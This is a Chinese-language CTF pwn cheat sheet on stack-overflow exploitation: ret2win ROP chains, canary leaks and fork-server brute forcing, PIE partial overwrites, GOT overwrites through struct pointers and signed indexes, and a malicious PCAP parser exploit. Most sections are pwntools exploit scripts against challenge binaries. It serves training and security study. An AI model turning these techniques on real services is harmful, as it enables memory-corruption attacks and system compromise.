# CTF Pwn - 溢出基础

## 目录
- [栈缓冲区溢出](#栈缓冲区溢出)
  - [带参数的 ret2win（magic 值检查）](#带参数的-ret2winmagic-值检查)
  - [栈对齐（16 字节要求）](#栈对齐16-字节要求)
  - [从反汇编计算偏移](#从反汇编计算偏移)
  - [输入过滤（memmem 检查）](#输入过滤memmem-检查)
  - [寻找 gadget](#寻找-gadget)
  - [CMP 立即数里的隐藏 gadget](#cmp-立即数里的隐藏-gadget)
- [结构体指针覆写（堆菜单题）](#结构体指针覆写堆菜单题)
- [有符号整数绕过（负数量）](#有符号整数绕过负数量)
- [绕过 canary 的部分溢出](#绕过-canary-的部分溢出)
- [通过步长/速率泄漏的越界读（DiceCTF 2026）](#通过步长速率泄漏的越界读dicectf-2026)
- [fork 型服务器上的栈 canary 逐字节爆破](#fork-型服务器上的栈-canary-逐字节爆破)
- [全局缓冲区溢出（CSV 注入）](#全局缓冲区溢出csv-注入)
- [协议长度字段栈泄漏（EKOPARTY CTF 2016）](#协议长度字段栈泄漏ekoparty-ctf-2016)
- [未校验 memcpy 长度导致解析器栈溢出（MetaCTF Flash 2026）](#未校验-memcpy-长度导致解析器栈溢出metactf-flash-2026)
- [栈 canary 空字节覆写泄漏（CSAW 2017）](#栈-canary-空字节覆写泄漏csaw-2017)
- [空 token 的 strncmp(n=0) MAC 绕过（UCSB iCTF 2018）](#空-token-的-strncmpn0-mac-绕过ucsb-ictf-2018)
- [返回地址 LSB 覆写 + read() 串联（TUCTF 2018）](#返回地址-lsb-覆写--read-串联tuctf-2018)
- [越过空字节一个字节填充的 canary 尾字节泄漏（hxp 2018）](#越过空字节一个字节填充的-canary-尾字节泄漏hxp-2018)
- [只校验索引 + 步长导致越界写（P.W.N. CTF 2018）](#只校验索引--步长导致越界写pwn-ctf-2018)
- [有符号索引负向越界写前置 GOT（P.W.N. CTF 2018）](#有符号索引负向越界写前置-gotpwn-ctf-2018)
- [PIE 同页函数单字节覆写跳转（P.W.N. CTF 2018）](#pie-同页函数单字节覆写跳转pwn-ctf-2018)
- [利用 scanf 格式错误跳过写以保留 canary（nullcon HackIM 2019）](#利用-scanf-格式错误跳过写以保留-canarynullcon-hackim-2019)

---

<a id="stack-buffer-overflow"></a>
## 栈缓冲区溢出

1. 找返回地址偏移：先 `cyclic 200`，再 `cyclic -l <value>`
2. 检查保护：`checksec --file=binary`
3. 无 PIE + 无 canary = 直接 ROP
4. 通过格式化字符串或部分覆写泄漏 canary

<a id="ret2win-with-parameter-magic-value-check"></a>
### 带参数的 ret2win（magic 值检查）

**模式：** win 函数在打印 flag 前会把参数与 magic 值比较。

```c
// Common pattern in disassembly
void win(long arg) {
    if (arg == 0x1337c0decafebeef) {  // Magic check
        // Open and print flag
    }
}
```

**利用（x86-64）：**
```python
from pwn import *

# Find gadgets
pop_rdi_ret = 0x40150b   # pop rdi; ret
ret = 0x40101a           # ret (for stack alignment)
win_func = 0x4013ac
magic = 0x1337c0decafebeef

offset = 112 + 8  # = 120 bytes to reach return address

payload = b"A" * offset
payload += p64(ret)        # Stack alignment (Ubuntu/glibc requires 16-byte)
payload += p64(pop_rdi_ret)
payload += p64(magic)
payload += p64(win_func)
```

**寻找 win 函数：**
- 在 Ghidra 中搜索 `fopen("flag.txt")` 或类似调用
- 寻找没有被 XREF、且检查某个 magic 参数的函数
- 检查参数比较之后的条件打印/退出分支

<a id="stack-alignment-16-byte-requirement"></a>
### 栈对齐（16 字节要求）

现代 Ubuntu/glibc 在执行 `call` 指令前要求栈按 16 字节对齐。未对齐的症状：
- 在 `movaps` 指令上触发 SIGSEGV（SSE 要求对齐）
- 崩溃在 libc 函数内部（printf、system 等）

**修复：** 在 ROP 链之前多加一个 `ret` gadget：
```python
payload = b"A" * offset
payload += p64(ret)        # Align stack to 16 bytes
payload += p64(pop_rdi_ret)
# ... rest of chain
```

<a id="offset-calculation-from-disassembly"></a>
### 从反汇编计算偏移

```asm
push   %rbp
mov    %rsp,%rbp
sub    $0x70,%rsp        ; Stack frame = 0x70 (112) bytes
...
lea    -0x70(%rbp),%rax  ; Buffer at rbp-0x70
mov    $0xf0,%edx        ; read() size = 240 (overflow!)
```

**计算偏移：**
- 缓冲区起始于 `rbp - buffer_offset`（例如 rbp-0x70）
- 保存的 RBP 位于 `rbp`（相对缓冲区末尾偏移 0）
- 返回地址位于 `rbp + 8`
- **总偏移 = buffer_offset + 8** = 112 + 8 = 120 字节

<a id="input-filtering-memmem-checks"></a>
### 输入过滤（memmem 检查）

有些题目用 `memmem()` 过滤输入以屏蔽特定字符串：
```python
payload = b"A" * 120 + p64(gadget) + p64(value)
assert b"badge" not in payload and b"token" not in payload
```

<a id="finding-gadgets"></a>
### 寻找 gadget

```bash
# Find pop rdi; ret
objdump -d binary | grep -B1 "pop.*rdi"
ROPgadget --binary binary | grep "pop rdi"

# Find simple ret (for alignment)
objdump -d binary | grep -E "^\s+[0-9a-f]+:\s+c3\s+ret"
```

<a id="hidden-gadgets-in-cmp-immediates"></a>
### CMP 立即数里的隐藏 gadget

带大立即数的 CMP 指令会编码出有用的字节序列。pwntools 的 `ROP()` 会自动找到它们：

```asm
# Example: cmpl $0xc35e415f, -0x4(%rbp)
# Bytes: 81 7d fc 5f 41 5e c3
#                  ^^ ^^ ^^ ^^
# At +3: 5f 41 5e c3 = pop rdi; pop r14; ret
# At +4: 41 5e c3    = pop r14; ret
# At +5: 5e c3       = pop rsi; ret
```

**何时去找：** 函数很少的小程序往往缺少标准 gadget。检查带大立即数的 `cmp`、`mov`、`test` 指令——它们的操作数字节可能反汇编成有用的 gadget。

```python
rop = ROP(elf)
# pwntools finds these automatically
for addr, gadget in rop.gadgets.items():
    print(hex(addr), gadget)
```

<a id="struct-pointer-overwrite-heap-menu-challenges"></a>
## 结构体指针覆写（堆菜单题）

**模式：** 菜单式程序对包含数据缓冲区与指针的结构体提供创建/修改/删除/查看操作。修改（edit）函数读取的字节数多于数据缓冲区，溢出到相邻的指针字段。

**结构体布局示例：**
```c
struct Student {
    char name[36];      // offset 0x00 - data buffer
    int *grade_ptr;     // offset 0x24 - pointer to separate allocation
    float gpa;          // offset 0x28
};  // total: 0x2c (44 bytes)
```

**利用：**
```python
from pwn import *

WIN = 0x08049316
GOT_TARGET = 0x0804c00c  # printf@GOT

# 1. Create object (allocates struct + sub-allocations)
create_student("AAAA", 5, 3.5)

# 2. Modify name - overflow into pointer field with GOT address
payload = b'A' * 36 + p32(GOT_TARGET)  # 36 bytes padding + GOT addr
modify_name(0, payload)

# 3. Modify grade - scanf("%d", corrupted_ptr) writes to GOT
modify_grade(0, str(WIN))  # Writes win addr as int to GOT entry

# 4. Trigger overwritten function -> jumps to win
```

**GOT 目标选择策略：**
- 先确定 `win` 函数内部调用了哪些 libc 函数
- 不要覆写 `win` 自己会用到的 GOT 项（会导致无限递归/崩溃）
- 优先选择写入之后主循环中才会调用的函数

| win 使用 | 安全的 GOT 目标 |
|----------|-------------------|
| puts, fopen, fread, fclose, exit | printf, free, getchar, malloc, scanf |
| printf, system | puts, exit, free |
| 仅 system | puts, printf, exit |

<a id="signed-integer-bypass-negative-quantity"></a>
## 有符号整数绕过（负数量）

`scanf("%d")` 没有符号检查；负输入可以绕过无符号比较。完整细节见 [advanced-exploits.md](advanced-exploits.md#有符号整数绕过负数数量)。

<a id="canary-aware-partial-overflow"></a>
## 绕过 canary 的部分溢出

在不触碰 canary 的前提下溢出缓冲区与 canary 之间的 `valid` 标志。用 `./` 作为无副作用的路径填充来精确控制长度。完整利用链见 [advanced-exploits.md](advanced-exploits.md#感知-canary-的部分溢出)。

<a id="oob-read-via-striderate-leak-dicectf-2026"></a>
## 通过步长/速率泄漏的越界读（DiceCTF 2026）

**模式（ByteCrusher）：** 字符串处理函数以可配置的步长（`rate`）遍历输入缓冲区。当 rate 大于缓冲区大小时，它会跳过空字节终止符并读到相邻的栈数据（canary、返回地址）。

**栈布局：**
```text
input_buf  [0-31]    <- user input (null at byte 31)
crushed    [32-63]   <- output buffer
canary     [72-79]   <- stack canary
saved rbp  [80-87]
return addr [88-95]  <- code pointer (defeats PIE)
```

**存在漏洞的写法：**
```c
void crush_string(char *input, char *output, int rate, int output_max_len) {
    for (int i = 0; input[i] != '\0' && out_idx < output_max_len - 1; i += rate) {
        output[out_idx++] = input[i];  // rate > bufsize skips past null terminator
    }
}
```

**利用：**
```python
from pwn import *

# Leak canary bytes 1-7 (byte 0 always 0x00)
canary = b'\x00'
for offset in range(73, 80):  # canary at offsets 72-79
    p.sendline(b'A' * 31)     # fill buffer (null at byte 31)
    p.sendline(str(offset).encode())  # rate = offset → reads input[0] then input[offset]
    p.sendline(b'2')           # output length = 2
    resp = p.recvline()
    canary += resp[1:2]        # second char is leaked byte

# Leak return address bytes 0-5 (top 2 always 0x00 in userspace)
ret_addr = b''
for offset in range(88, 94):
    p.sendline(b'A' * 31)
    p.sendline(str(offset).encode())
    p.sendline(b'2')
    resp = p.recvline()
    ret_addr += resp[1:2]

pie_base = u64(ret_addr.ljust(8, b'\x00')) - known_offset
admin_portal = pie_base + admin_offset

# Overflow gets() with leaked canary + computed address
payload = b'A' * 24 + canary + p64(0) + p64(admin_portal)
p.sendline(payload)
```

**何时使用：** 任何以用户可控步长遍历缓冲区、并以空字节终止符作为停止条件的函数。

**关键点：** 基于步长的越界读每轮泄漏一个字节，只需控制哪次偏移落在目标字节上。迭代足够多次，就能泄漏完整的 canary 与返回地址，同时攻破栈 canary 和 PIE。

<a id="stack-canary-byte-by-byte-brute-force-on-forking-servers"></a>
## fork 型服务器上的栈 canary 逐字节爆破

**模式：** 服务器为每个连接调用 `fork()`。子进程继承同一个 canary 值。逐字节爆破 canary——错误字节只让子进程崩溃，父进程仍带着同一个 canary 继续服务。

**canary 结构：** 首字节恒为 `\x00`（防止字符串函数泄漏）。其余 7 字节随机。x86-64 共 8 字节，x86-32 共 4 字节。

**利用：**
```python
from pwn import *

OFFSET = 64  # bytes to canary (buffer size)
HOST, PORT = "target", 1337

def try_byte(known_canary, guess_byte):
    """Send overflow with known canary bytes + one guess. No crash = correct byte."""
    p = remote(HOST, PORT)
    payload = b'A' * OFFSET + known_canary + bytes([guess_byte])
    p.send(payload)
    try:
        resp = p.recv(timeout=1)
        p.close()
        return True   # No crash → byte is correct
    except:
        p.close()
        return False  # Crash → wrong byte

# Byte 0 is always \x00
canary = b'\x00'

# Brute-force bytes 1-7 (only 256 attempts per byte, 7*256 = 1792 total)
for byte_pos in range(1, 8):
    for guess in range(256):
        if try_byte(canary, guess):
            canary += bytes([guess])
            print(f"Canary byte {byte_pos}: 0x{guess:02x}")
            break
    else:
        print(f"Failed at byte {byte_pos}")
        break

print(f"Full canary: {canary.hex()}")

# Now overflow with correct canary + ROP chain
p = remote(HOST, PORT)
payload = b'A' * OFFSET + canary + b'B' * 8 + p64(win_addr)
p.sendline(payload)
```

**前提条件：**
- 服务器必须为每个连接 `fork()`（canary 在子进程之间保持不变）
- 溢出必须能逐字节控制（不能一次性读取全部数据）
- 能区分崩溃与成功响应（超时、错误消息或连接行为）

**预期尝试次数：** 7 * 128 = 896 次（7 字节 × 每字节平均 128 次猜测）。最多 7 * 256 = 1792 次。

**关键点：** `fork()` 会让 canary 在所有子进程中保持一致。逐字节爆破（7 * 256 = 1792 次）远比一次性爆破全部 8 字节（2^56 次）高效。

---

<a id="global-buffer-overflow-csv-injection"></a>
## 全局缓冲区溢出（CSV 注入）

**模式（Spreadsheet）：** 通过额外的 CSV 分隔符溢出相邻全局变量，从而篡改文件名指针。完整利用模式见 [advanced.md](advanced.md)。

---

<a id="protocol-length-field-stack-bleeding-ekoparty-ctf-2016"></a>
## 协议长度字段栈泄漏（EKOPARTY CTF 2016）

自定义网络协议如果根据请求头中的长度字段回显数据，当长度超过实际发送的数据量时会泄漏栈内存（类似 Heartbleed）。

```python
from pwn import *

# Custom protocol: [4-byte magic][1-byte length][payload]
# Server echoes back `length` bytes of the response buffer
# If length > actual payload, server leaks stack/heap memory

io = remote('target.ctf', 1337)

# Normal request: 5 bytes of data, length = 5
# Bleeding request: 5 bytes of data, length = 255
magic = b'\x00\x01\x02\x03'
length_field = b'\xff'  # request 255 bytes back
payload = b'AAAAA'      # only send 5 bytes

io.send(magic + length_field + payload)
leaked = io.recv(255)

# Search leaked memory for flag pattern
if b'flag{' in leaked or b'CTF{' in leaked:
    log.success(f"Flag found in leaked data!")

# Alternatively, search for addresses (libc pointers, stack addresses)
for i in range(0, len(leaked) - 8, 8):
    addr = u64(leaked[i:i+8])
    if 0x7f0000000000 < addr < 0x7fffffffffff:
        log.info(f"Possible libc/stack address at offset {i}: {hex(addr)}")
```

**关键点：** 只要服务器用客户端提供的长度决定返回多少数据，该协议就存在过度读取漏洞。服务器会读过实际缓冲区边界进入相邻的栈/堆内存，泄漏包括 flag、地址和 canary 在内的敏感数据。

---

<a id="parser-stack-overflow-via-unchecked-memcpy-length-metactf-flash-2026"></a>
## 未校验 memcpy 长度导致解析器栈溢出（MetaCTF Flash 2026）

**模式（PCAP Trap）：** 自定义文件解析器（如 PCAP、图片、压缩包）分配固定大小的栈缓冲区，却允许输入记录的 len 超过缓冲区大小。`memcpy` 在长度校验之前就把整条记录拷入栈缓冲区，覆写保存的寄存器和返回地址。

```python
from pwn import *

# Example: PCAP parser with 0x10000 byte stack buffer
# but PCAP packets can specify up to 0x20000 bytes (snaplen)
# memcpy(stack_buf, packet_data, packet_len) has no bounds check

elf = ELF('./pcap_parser')
context.binary = elf

# Step 1: Determine overflow offset
# Buffer is 0x10000 bytes on stack
# After buffer: saved callee-save registers (rbx, r12, ...) then return address
BUF_SIZE = 0x10000
# Offset to saved registers depends on function prologue
# Check disassembly: push rbx; push r12; sub rsp, 0x10000
OFFSET_RBX = BUF_SIZE       # first saved register
OFFSET_R12 = BUF_SIZE + 8   # second saved register
OFFSET_RET = BUF_SIZE + 16  # return address

# Step 2: Craft payload with register restoration
# Callee-saved registers must be valid or the function epilogue crashes
# rbx: point to readable memory (e.g., BSS) to avoid SIGSEGV on dereference
# r12: set to value that exits cleanly (e.g., loop terminator = 1)

bss_addr = elf.bss()         # Readable memory for rbx
win_addr = elf.symbols['win'] # Target function

payload = b'A' * BUF_SIZE
payload += p64(bss_addr)      # rbx -> valid readable address
payload += p64(1)             # r12 = 1 (loop exit condition)
payload += p64(elf.symbols['ret_gadget'])  # ret alignment gadget
payload += p64(win_addr)      # return to win()

# Step 3: Wrap in valid file format container
# For PCAP: valid global header + packet header with large caplen
import struct

# PCAP global header
pcap_header = struct.pack('<IHHIIII',
    0xa1b2c3d4,  # magic number
    2, 4,        # version 2.4
    0,           # thiszone
    0,           # sigfigs
    0x20000,     # snaplen (max packet size - larger than stack buffer!)
    1            # network (LINKTYPE_ETHERNET)
)

# PCAP packet record header
pkt_ts_sec = 0
pkt_ts_usec = 0
pkt_caplen = len(payload)   # captured length = our overflow payload
pkt_origlen = len(payload)

pkt_header = struct.pack('<IIII', pkt_ts_sec, pkt_ts_usec, pkt_caplen, pkt_origlen)

# Build malicious PCAP
pcap_data = pcap_header + pkt_header + payload

with open('exploit.pcap', 'wb') as f:
    f.write(pcap_data)

# Step 4: Send to target
p = remote('target', 1337)
p.send(pcap_data)
p.interactive()
```

**关键点：** 自定义文件解析器常按“最大预期尺寸”分配固定大小的栈缓冲区，而文件格式本身允许指定更大的记录。`memcpy` 发生在长度检查之前，构成典型的栈溢出。利用时必须在溢出载荷中把被调用者保存寄存器恢复为合法值——函数收尾会先弹出它们再返回，非法值会导致在到达返回地址前崩溃。常见要求：`rbx` 必须指向可读内存（用 BSS），循环计数寄存器必须满足退出条件。

**被调用者保存寄存器恢复清单：**
1. 找出函数序言压入（`push rbx`、`push r12` 等）了哪些寄存器
2. 确定收尾时恢复它们的顺序（与压入顺序相反）
3. 把 `rbx` 设为任意可读地址（BSS、GOT 或已知映射页）
4. 把循环计数器（`r12`、`r13`）设为能让循环正常终止的值
5. 在 win 函数地址之前加一个 `ret` gadget 以满足 16 字节栈对齐

**何时识别：** 题目涉及二进制格式（PCAP、ELF、图片、protocol buffer）的自定义解析器。解析器使用输入中的长度字段调用 `memcpy` 或 `read`。检查缓冲区大小是否小于该格式允许的最大长度。

**参考：** MetaCTF Flash CTF 2026 "PCAP Trap"

---

<a id="stack-canary-null-byte-overwrite-leak-csaw-2017"></a>
## 栈 canary 空字节覆写泄漏（CSAW 2017）

**模式：** 栈 canary 总以空字节结尾（最低字节为 `\x00`），以防止基于字符串的泄漏。如果溢出恰好把这个空字节覆写成非空字符，`puts()` 或 `printf("%s")` 就会越过被覆写的字节继续打印，输出 canary 剩余的 7 个字节。再通过返回到 main 提供第二阶段利用，此时完整 canary 已知。

**栈布局：**
```text
[buffer] [canary \x00 XX XX XX XX XX XX XX] [saved rbp] [return addr]
                  ^--- overwrite only this byte with 'A'
                  → puts() now prints: 'A' + 7 canary bytes + (more stack data)
```

**利用：**
```python
from pwn import *

# Stage 1: Overwrite canary's null byte, leak remaining 7 bytes via puts
p.send(b'A' * buf_size + b'B')   # 'B' overwrites the canary's null byte
leak = p.recvline()
# leak[buf_size] = 'B', leak[buf_size+1:buf_size+8] = 7 canary bytes
canary = b'\x00' + leak[buf_size + 1: buf_size + 8]
canary_val = u64(canary)
log.info(f"Leaked canary: {hex(canary_val)}")

# Stage 2: Return-to-main for clean second exploitation
# First stage payload returned to main() — now build full ROP chain
p.send(b'A' * buf_size + canary + p64(0) + p64(win_addr))
```

**为什么返回到 main：** 覆写 canary 空字节完成泄漏后，canary 已被破坏——进程在返回时必然崩溃。返回到 main（通过第一阶段溢出）会干净地重置栈帧，允许用已知的 canary 进行第二次输入。

**关键点：** canary 的空字节终止符是个弱点——只覆写它就能让字符串函数打印出 canary。返回到 main 提供带泄漏 canary 的二次利用机会，从而构造完整 ROP 链。

**参考：** CSAW 2017

---

<a id="empty-token-strncmpn0-mac-bypass-ucsb-ictf-2018"></a>
## 空 token 的 strncmp(n=0) MAC 绕过（UCSB iCTF 2018）

**模式：** MAC 或鉴权 token 校验从用户提供的字段中取出 `n`（比较长度），再调用 `strncmp(expected, supplied, n)`。当 `n == 0` 时，`strncmp` 无论输入是什么都返回 0——任何 token 都会被接受。

**存在漏洞的代码：**
```c
int n = atoi(user_len);            // attacker controls length
if (strncmp(expected_mac, user_mac, n) == 0) {
    grant_access();
}
```

**利用：** 发送 `len=0`（或被解析为零的长度字段）的 token，MAC 随意填写。

**关键点：** 任何变长比较函数（`strncmp`、`memcmp`、`bcmp`）在长度为零时都返回相等。必须单独校验长度：拒绝 `n <= 0`，或改用 `CRYPTO_memcmp`/`hmac_equal` 比较完整的定长缓冲区。当长度来自客户端提供的 HMAC 尺寸或 TLV 头时也会出现同样的 bug。

**参考：** UCSB iCTF 2018 — writeup 10009

---

<a id="return-address-lsb-overwrite--read-chaining-tuctf-2018"></a>
## 返回地址 LSB 覆写 + read() 串联（TUCTF 2018）

**模式：** `read(0, buf, 0x80)` 恰好越界一个字节写入保存的返回地址（读取长度差一）。只覆写 LSB 可保留高位字节，于是落回同一函数中偏前几个字节的位置。选一个指向函数序言中另一次 `read()` 调用之前的字节——它会带着攻击者可控的参数再次触发。

```python
# Offset 29 in the buffer = saved RIP LSB
payload = b'\x15' * 29     # 0x56555d22 -> 0x56555d15 (inside read() prologue)
p.sendline(payload)

# Second read call now reads into &password with length 0x2b
p.send(p32(0) + p32(password_addr) + p32(0x2b))
```

**关键点：** 把单字节返回地址覆写当作“再次调用该函数”的原语，往往比完整 ROP 更强大，因为它完全绕过 ASLR——你跳到的是已知相对偏移处的指令。

**参考：** TUCTF 2018 — Lisa，writeup 12339

---

<a id="canary-trailing-byte-leak-via-padding-one-byte-past-null-hxp-2018"></a>
## 越过空字节一个字节填充的 canary 尾字节泄漏（hxp 2018）

**模式：** glibc 栈 canary 总以 `0x00` 开头，使 `strcpy`/`printf("%s")` 立即停止。精确发送 `buf_size + 1` 字节；`puts()` 回显会越过 canary 的前导空字节，打印出剩余三个字节，得到 3/4 的 canary。

```python
p.send(b'A' * (buf_size + 1))
leaked = p.recvline().rstrip(b'\n')
canary = b'\x00' + leaked[buf_size:]     # reconstruct full 4-byte canary
```

**关键点：** 让 canary 对字符串操作“安全”的那个字节，同时也是能实现泄漏的字节——把它换成非空字节，回显就会一直吐到下一个空字节为止。

**参考：** hxp CTF 2018 — poor_canary，writeup 12568

---

<a id="index-only-bounds-check--stride-oob-write-pwn-ctf-2018"></a>
## 只校验索引 + 步长导致越界写（P.W.N. CTF 2018）

**模式：** 有漏洞的函数读取索引 `v2`，检查 `v2 <= 0xfc`，然后在 `array[12 * v2]` 处写 `0xC` 字节。检查约束的是*索引*，而不是*计算出的字节偏移*。选一个让 `12 * v2` 落在缓冲区之外很远位置（保存的 RIP、canary、GOT）的 `v2`。

```c
if (v2 <= 0xFC) read(0, &array[12*v2], 0xC);   // bug: stride unchecked
```

取 `v2 = 0xFB`，即可在数组基址之后偏移 `12 * 0xFB = 0xBC4` 处写 12 个字节。

**关键点：** 每个“有界索引”检查都必须先乘以元素步长再比较。留意任何 `array[N*idx]` 或按结构体索引的写入，如果检查只针对 `idx`，那么有效上界其实是 `max_offset / stride`。

**参考：** P.W.N. CTF 2018 — Exploitation Class / Kindergarten PWN，writeup 12041

---

<a id="signed-index-negative-oob-to-preceding-got-pwn-ctf-2018"></a>
## 有符号索引负向越界写前置 GOT（P.W.N. CTF 2018）

**模式：** `if (v5 <= 31) array[v5] = value;` 会被编译成*有符号*比较。传入 `-1`、`-2`…… 能通过检查并向低地址方向写入前面的内存——通常是 GOT 或相邻的全局结构。

```c
int v5 = atoi(input);     // signed
if (v5 <= 31) table[v5] = new_value;   // writes to table[-N]
```

用负索引先泄漏 libc（读 `read` 的 GOT），再覆写一个空闲的 GOT 项为 `system`。

**关键点：** 有符号/无符号不匹配随处可见。永远检查声明类型；带 `<= N` 守卫的有符号索引，实际范围是 `[INT_MIN..N]`。用 `-Wsign-conversion` 编译可静态发现这类问题。

**参考：** P.W.N. CTF 2018 — Kindergarten PWN，writeup 12041

---

<a id="pie-same-page-function-pivot-via-single-byte-overwrite-pwn-ctf-2018"></a>
## PIE 同页函数单字节覆写跳转（P.W.N. CTF 2018）

**模式：** 程序是 PIE，但两个函数位于同一个 4 KiB 页：`fread_callback` 在 `base + 0x11BC`，`shell()` 在 `base + 0x11A9`。页内相对偏移由链接器固定，因此只需覆写栈上函数指针的*最低字节*即可把 `0xBC` 改写为 `0xA9`，无需任何泄漏。

```python
p.send(b'A' * overflow_to_fp + b'\xa9')
```

**关键点：** PIE 只随机化页对齐以上的位。同页的两个代码地址只在低 12 位不同，所以只要在编译期能让目标函数落在同一页，单字节覆写就是无需 ASLR 泄漏的部分覆写。

**参考：** P.W.N. CTF 2018 — Important Service，writeup 12041

---

<a id="scanf-format-error-skip-for-canary-preservation-nullcon-hackim-2019"></a>
## 利用 scanf 格式错误跳过写以保留 canary（nullcon HackIM 2019）

**模式（babypwn）：** `coin_count` 按有符号比较（`(char)count > 20` 只拒绝正向溢出），却按无符号迭代（`for (uint8_t i = 0; i < count; ++i)`）。发送 `128` 能通过检查却循环 128 次，越过 20 槽的 int 数组、栈 canary、保存的 RBP 和保存的 RIP。常规的“用同一个 bug 泄漏 canary”技巧在此失效，因为有漏洞的 `printf` 只在溢出循环**之后**才触发。改为在写 canary 的那两次迭代中给 scanf 喂一个格式不符的 token，让 scanf 返回错误**且不消费输入、不写入**——canary 保持完好，后续迭代继续越过它写入。

```python
from pwn import *

target.sendline('y')
target.sendline('2019')           # name
target.sendline('128')            # unsigned char > 20 passes signed check

# Leak libc via GOT addresses in the first 8 coin slots (%8$s in the format string)
target.sendline(str(0x600FA8))    # free@GOT lower 32 bits
target.sendline(str(0))           # free@GOT upper 32 bits
# ... repeat for puts / setbuf / printf ...

for i in range(14):               # pad to reach canary slot (22 writes in)
    target.sendline('1')
    target.sendline('2')

target.sendline('-')              # "-" matches "%d" prefix but can't be a number
target.sendline('-')              # scanf returns error, leaves canary untouched
target.sendline('0')              # saved libc_csu_init slot - scratch
target.sendline('0')
target.sendline(str(0x400806))    # return address -> main() for stage 2
target.sendline(str(0))
```

**关键点：** `scanf("%d", ...)` 会把孤立的 `-` 视为格式不匹配——它提前返回，不向目标写入，而且关键的是不消费这个 `-` 字节；下一次 scanf 也会同样失败。用这个跳过原语，你可以精确决定“固定次数”写循环的哪些迭代真正落到栈上，从而越过 canary/RBP 槽位抵达返回地址。再配合有符号/无符号字符比较 bug，就能得到超过声明上限的循环次数。

**参考：** nullcon HackIM 2019 — babypwn，writeup 13211
